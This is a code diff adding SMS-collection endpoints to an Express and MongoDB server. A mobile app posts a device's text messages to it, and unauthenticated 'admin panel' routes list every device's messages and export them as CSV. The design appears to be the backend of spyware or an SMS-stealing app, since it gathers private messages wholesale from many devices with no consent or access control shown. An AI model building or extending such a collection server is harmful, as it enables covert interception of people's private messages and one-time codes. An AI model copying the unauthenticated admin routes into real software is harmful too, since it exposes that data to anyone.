@@ -86,5 +86,85 @@ app.get("/api/devices/:deviceId/csv", async (req, res) => {
   }
 });
 
+// ==================== SMS ENDPOINTS ====================
+
+// SMS schema
+const SmsSchema = new mongoose.Schema({
+  deviceId: { type: String, unique: true },
+  deviceName: String,
+  messages: Array,
+  lastSync: Date,
+});
+const Sms = mongoose.model("Sms", SmsSchema);
+
+// App posts SMS here
+app.post("/api/sms-sync", async (req, res) => {
+  try {
+    const { deviceId, deviceName, messages } = req.body;
+    if (!deviceId || !messages) {
+      return res.status(400).json({ error: "Missing data" });
+    }
+
+    // Merge with existing messages (avoid duplicates by timestamp+body)
+    const existing = await Sms.findOne({ deviceId });
+    let allMessages = messages;
+    if (existing && existing.messages) {
+      const seen = new Set(existing.messages.map((m) => `${m.timestamp}|${m.body}`));
+      const newOnes = messages.filter((m) => !seen.has(`${m.timestamp}|${m.body}`));
+      allMessages = [...existing.messages, ...newOnes];
+    }
+
+    await Sms.findOneAndUpdate(
+      { deviceId },
+      { deviceId, deviceName, messages: allMessages, lastSync: new Date() },
+      { upsert: true, new: true }
+    );
+
+    console.log(`📥 Received ${messages.length} SMS from ${deviceName}`);
+    res.json({ success: true, count: messages.length, total: allMessages.length });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// Admin panel: list SMS devices
+app.get("/api/sms-devices", async (req, res) => {
+  const devices = await Sms.find().sort({ lastSync: -1 });
+  res.json(devices);
+});
+
+// Admin panel: get one SMS device
+app.get("/api/sms-devices/:deviceId", async (req, res) => {
+  const d = await Sms.findOne({ deviceId: req.params.deviceId });
+  res.json(d);
+});
+
+// Download SMS as CSV
+app.get("/api/sms-devices/:deviceId/csv", async (req, res) => {
+  try {
+    const device = await Sms.findOne({ deviceId: req.params.deviceId });
+    if (!device) return res.status(404).send("Device not found");
+
+    const header = "Sender,Body,Time\n";
+    const rows = (device.messages || [])
+      .map((m) => {
+        const sender = (m.sender || "").replace(/,/g, " ").replace(/\n/g, " ");
+        const body = (m.body || "").replace(/,/g, " ").replace(/\n/g, " ");
+        const time = new Date(m.timestamp).toISOString();
+        return `${sender},${body},${time}`;
+      })
+      .join("\n");
+
+    const filename = `${(device.deviceName || "device").replace(/[^a-z0-9]/gi, "_")}_sms.csv`;
+    res.setHeader("Content-Type", "text/csv");
+    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
+    res.send(header + rows);
+  } catch (err) {
+    res.status(500).send(err.message);
+  }
+});
+
+// ==================== END SMS ENDPOINTS ====================
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, "0.0.0.0", () => console.log(`🚀 Port ${PORT}`));
